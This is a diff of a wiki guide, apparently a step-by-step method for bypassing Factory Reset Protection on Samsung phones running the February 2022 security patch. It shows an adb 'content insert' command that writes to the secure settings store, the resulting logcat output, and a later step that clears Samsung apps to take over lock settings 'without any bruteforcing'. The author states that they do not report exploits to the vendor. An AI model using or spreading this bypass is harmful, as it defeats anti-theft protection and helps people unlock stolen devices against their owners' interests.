@@ -6,8 +6,6 @@
 
 <center>More info about the the CVC from Samsung here(https://security.samsungmobile.com/serviceWeb.smsb)</center>
 
-#### Security patch version for my device 
-
 No worries, I got you covered with a newer version (they  are fast but not fast enough so I decided to share this wiki to the public - This hack works perfect for all Samsung devices with latest securit patch (2022-02-01) while the wiki is created it works awesome still (2022-02-21),.This method  does **NOT** work on Android 11 so you have an Android 11 FPR locked device so you can upgrade to the latest firmware from Samsung)
 
 I share it freely because it's fun and because I can and because I think it's fun to share knowledge, I never report exploits or security issues for money! For me, time is more valuable than money.
@@ -104,7 +102,7 @@ I share it freely because it's fun and because I can and because I think it's fu
 
 #### 45) Accept the `adb request` on your phone
 
-## Via `adb`, execute below on device: 
+* Now via `adb`, execute below on device: 
 
 ```bash
 content insert --uri content://settings/secure \
@@ -112,7 +110,7 @@ content insert --uri content://settings/secure \
   --bind value:s:1
 ```
 
-#### For all who is interested more deeply, logcat gives us: 
+* For everyone that is interested more deeply, logcat gives us: 
 
 ```
 02-20 23:25:40.306   936  8470 D RestrictionPolicy: isSettingsChangesAllowedAsUser, userId 0 : true
@@ -133,8 +131,6 @@ content insert --uri content://settings/secure \
 02-20 23:25:40.346  5655  5655 I AODSettingsHelper: **#### onSettingsValueChanged callbackList == null
 02-20 23:25:40.346  5655  5655 D DeviceProvisionedControllerImpl: Setting change: content://settings/secure/user_set
 ```
-
-## Back to mobile device
 
 #### 46) Press `volume up` + `power`
 
@@ -188,9 +184,7 @@ content insert --uri content://settings/secure \
 
 * You have just hacked samsung's latest security patch and there are a thousand reasons why i do not use cell phones ;)
 
-## Welcome Screen
-
-#### Since adb shell is still open, clear all samsung applications so we can take control over lock settings without any bruteforcing: 
+* Since adb shell is still open, clear all samsung applications so we can take control over lock settings without any bruteforcing: 
 
 ![](https://www.nr1.nu/hacking/android/Samsung_Galaxy.s10_plus_Android.v12.PREVIEWS/clear_all_samsung_apps.gif)
           
